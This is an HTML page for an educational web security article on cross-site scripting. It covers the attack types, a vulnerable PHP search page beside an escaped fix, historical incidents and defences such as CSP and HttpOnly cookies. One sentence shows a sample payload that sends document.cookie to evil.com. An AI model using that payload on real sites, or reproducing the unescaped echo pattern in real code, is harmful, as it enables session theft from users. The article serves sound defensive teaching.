<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS - Web Security Article</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000000;
            color: #d4d4d8; /* Zinc-300 */
        }
        /* Custom scrollbar for code blocks */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #18181b; 
        }
        ::-webkit-scrollbar-thumb {
            background: #3f3f46; 
            border-radius: 4px;
        }
        .code-keyword { color: #c084fc; } /* Purple */
        .code-func { color: #60a5fa; } /* Blue */
        .code-string { color: #a7f3d0; } /* Green */
        .code-var { color: #fca5a5; } /* Red/Pink */
        .code-tag { color: #fbbf24; } /* Amber */
        .code-comment { color: #71717a; font-style: italic; } /* Gray */
    </style>
</head>
<body class="antialiased min-h-screen pb-20">

    <div class="max-w-4xl mx-auto px-6 py-12">
        
         <a href="{{ route('cybersecurity') }}" class="inline-flex items-center text-gray-400 hover:text-white transition-colors mb-8 text-sm">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
            </svg>
            Back
        </a>

        <div class="flex items-center gap-4 mb-4">
            <span class="bg-purple-900/40 text-purple-300 border border-purple-700/50 px-3 py-1 rounded-full text-xs font-medium">Web Security</span>
            <div class="flex items-center text-gray-400 text-xs font-medium">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                </svg>
                December 7, 2025
            </div>
            <div class="flex items-center text-gray-400 text-xs font-medium">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                9 min read
            </div>
        </div>

        <h1 class="text-purple-400 font-medium text-lg mb-2">Cross-Site Scripting (XSS)</h1>
        <h2 class="text-3xl md:text-4xl font-bold text-gray-100 mb-10 leading-tight">Client-Side Code Injection & Session Hijacking</h2>

        <div class="bg-gray-900/30 border-l-4 border-purple-600 p-6 rounded-r-lg mb-12">
            <div class="flex items-start gap-4">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-purple-500 mt-1 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
                </svg>
                <p class="text-gray-300 leading-relaxed">
                    Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. Because the browser thinks the script came from a trusted source, it will execute the script, allowing the attacker to access cookies, session tokens, or other sensitive information retained by the browser.
                </p>
            </div>
        </div>

        <div class="space-y-10 text-gray-300">
            
            <section>
                <h3 class="text-xl font-semibold text-gray-100 mb-4">What is XSS?</h3>
                <p class="mb-4 leading-relaxed">
                    XSS attacks occur when an application includes untrusted data in a new web page without proper validation or escaping. When the victim visits the compromised page, the malicious script executes within their browser session.
                </p>
                <p class="mb-4 leading-relaxed">
                    Unlike SQL Injection which targets the server's database, XSS targets the application's users. An attacker might inject a payload like <code class="bg-gray-800 text-gray-200 px-1 py-0.5 rounded text-sm">&lt;script&gt;fetch('http://evil.com/'+document.cookie)&lt;/script&gt;</code> into a comment section. Every user who views that comment will unknowingly send their session cookies to the attacker's server.
                </p>
                <p class="leading-relaxed">
                    The impact ranges from simple nuisance (pop-ups) to full account takeover, redirection to phishing sites, or delivering malware.
                </p>
            </section>

            <section>
                <h3 class="text-xl font-semibold text-gray-100 mb-4">Types of XSS</h3>
                <p class="mb-4 leading-relaxed">
                    <strong>Stored XSS (Persistent):</strong> The malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment field). The victim retrieves the malicious script when they view the stored data.
                </p>
                <p class="mb-4 leading-relaxed">
                    <strong>Reflected XSS (Non-Persistent):</strong> The malicious script is reflected off the web server, such as in an error message or search result. The attack is delivered via a link; the user clicks a crafted link, and the script executes immediately.
                </p>
                <p class="leading-relaxed">
                    <strong>DOM-based XSS:</strong> The vulnerability exists in the client-side code rather than the server-side code. The attack payload is executed as a result of modifying the DOM "environment" in the victim's browser used by the original client-side script.
                </p>
            </section>

            <section>
                <div class="flex items-center gap-2 mb-6 text-purple-400 font-medium">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
                    </svg>
                    Code Examples
                </div>

                <div class="bg-[#111115] rounded-lg overflow-hidden border border-gray-800 mb-8">
                    <div class="bg-indigo-900/20 px-4 py-2 border-b border-gray-800 flex items-center justify-between">
                        <span class="text-indigo-400 text-sm font-medium">Vulnerable Code Example (PHP)</span>
                    </div>
                    <div class="p-4 overflow-x-auto">
<pre class="font-mono text-sm leading-6">
<span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Echoing user input directly into HTML</span>
<span class="code-var">$search_term</span> = <span class="code-var">$_GET</span>[<span class="code-string">'query'</span>];

<span class="code-func">echo</span> <span class="code-string">"&lt;div&gt;You searched for: "</span> . <span class="code-var">$search_term</span> . <span class="code-string">"&lt;/div&gt;"</span>;

<span class="code-comment">// Attack Payload: ?query=&lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="code-comment">// The browser renders the script tag and executes it.</span>
<span class="code-keyword">?&gt;</span>
</pre>
                    </div>
                </div>

                <div class="bg-[#111115] rounded-lg overflow-hidden border border-gray-800">
                    <div class="bg-blue-900/20 px-4 py-2 border-b border-gray-800 flex items-center justify-between">
                        <span class="text-blue-400 text-sm font-medium">Secure Code Example (PHP)</span>
                    </div>
                    <div class="p-4 overflow-x-auto">
<pre class="font-mono text-sm leading-6">
<span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Secure: Output Encoding</span>
<span class="code-var">$search_term</span> = <span class="code-var">$_GET</span>[<span class="code-string">'query'</span>];

<span class="code-comment">// htmlspecialchars converts special characters to HTML entities</span>
<span class="code-comment">// &lt; becomes &amp;lt;, &gt; becomes &amp;gt;, etc.</span>
<span class="code-var">$safe_term</span> = <span class="code-func">htmlspecialchars</span>(<span class="code-var">$search_term</span>, ENT_QUOTES, <span class="code-string">'UTF-8'</span>);

<span class="code-func">echo</span> <span class="code-string">"&lt;div&gt;You searched for: "</span> . <span class="code-var">$safe_term</span> . <span class="code-string">"&lt;/div&gt;"</span>;

<span class="code-comment">// Browser renders: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span>
<span class="code-comment">// This is displayed as text, not executed as code.</span>
<span class="code-keyword">?&gt;</span>
</pre>
                    </div>
                </div>
            </section>

            <section>
                

[Image of Cross-site scripting attack diagram]

                <div class="flex items-center gap-2 mb-6 text-yellow-500 font-medium mt-12">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                    Real-World Cases
                </div>

                <div class="grid gap-4">
                    <div class="bg-[#111115] border border-yellow-900/30 p-4 rounded-lg">
                        <p class="text-sm leading-relaxed"><strong>The Samy Worm (2005):</strong> Samy Kamkar released a Stored XSS worm on MySpace. Within 20 hours, it had infected over one million user profiles, forcing MySpace to take the site offline to fix the vulnerability.</p>
                    </div>
                    <div class="bg-[#111115] border border-yellow-900/30 p-4 rounded-lg">
                        <p class="text-sm leading-relaxed"><strong>British Airways / Magecart (2018):</strong> Attackers injected XSS-style "skimmer" code into the British Airways website via a compromised library. This script stole credit card details from 380,000 transactions in real-time.</p>
                    </div>
                    <div class="bg-[#111115] border border-yellow-900/30 p-4 rounded-lg">
                        <p class="text-sm leading-relaxed"><strong>TweetDeck (2014):</strong> A persistent XSS vulnerability allowed tweets to automatically retweet themselves when viewed. Thousands of users were affected before Twitter temporarily shut down TweetDeck services.</p>
                    </div>
                    <div class="bg-[#111115] border border-yellow-900/30 p-4 rounded-lg">
                        <p class="text-sm leading-relaxed"><strong>eBay (2014):</strong> A sophisticated XSS attack allowed attackers to inject malicious JavaScript into product listings, redirecting users to a fake login page designed to harvest credentials.</p>
                    </div>
                </div>
            </section>

            <section>
                <div class="flex items-center gap-2 mb-6 text-green-400 font-medium mt-12">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    Prevention & Mitigation
                </div>

                <div class="grid gap-4">
                    <div class="bg-[#051105] border border-green-900/30 p-4 rounded-lg flex items-start gap-3">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                        <p class="text-sm leading-relaxed"><strong>Output Encoding (Escaping):</strong> The primary defense against XSS. Convert untrusted input into a safe form where the browser interprets it only as data, not code (e.g., converting &lt; to &amp;lt;).</p>
                    </div>
                    <div class="bg-[#051105] border border-green-900/30 p-4 rounded-lg flex items-start gap-3">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                        <p class="text-sm leading-relaxed"><strong>Content Security Policy (CSP):</strong> An HTTP header that allows site operators to restrict the resources (such as JavaScript) that browsers are allowed to load for a given page, effectively neutralizing many XSS attacks.</p>
                    </div>
                    <div class="bg-[#051105] border border-green-900/30 p-4 rounded-lg flex items-start gap-3">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                        <p class="text-sm leading-relaxed"><strong>HttpOnly Cookies:</strong> Flag sensitive cookies (like session IDs) as "HttpOnly". This prevents client-side scripts (including XSS payloads) from reading the cookie data via `document.cookie`.</p>
                    </div>
                    <div class="bg-[#051105] border border-green-900/30 p-4 rounded-lg flex items-start gap-3">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                        <p class="text-sm leading-relaxed"><strong>Input Sanitization:</strong> If you must allow HTML input (e.g., in a WYSIWYG editor), use a trusted library like DOMPurify to strip out dangerous tags and attributes before rendering.</p>
                    </div>
                    <div class="bg-[#051105] border border-green-900/30 p-4 rounded-lg flex items-start gap-3">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                        <p class="text-sm leading-relaxed"><strong>Context-Aware Encoding:</strong> Understand where the data is being placed (HTML body, JavaScript variable, CSS attribute). Each context requires a different encoding method to be secure.</p>
                    </div>
                </div>
            </section>

            <div class="bg-gray-800/40 p-8 rounded-lg mt-12 border border-gray-700/50">
                <h4 class="text-white text-lg font-semibold mb-4">Conclusion</h4>
                <p class="text-gray-400 text-sm leading-relaxed">
                    Cross-Site Scripting (XSS) is a pervasive vulnerability that breaks the fundamental isolation between a website and its users. While it is often underestimated compared to server-side attacks like SQL Injection, XSS serves as a gateway to credential theft, session hijacking, and malware distribution. Modern frameworks like React and Vue offer built-in protection, but developers must remain vigilant, particularly when handling raw HTML or configuring Content Security Policies.
                </p>
            </div>

        </div>

    </div>
</body>
</html>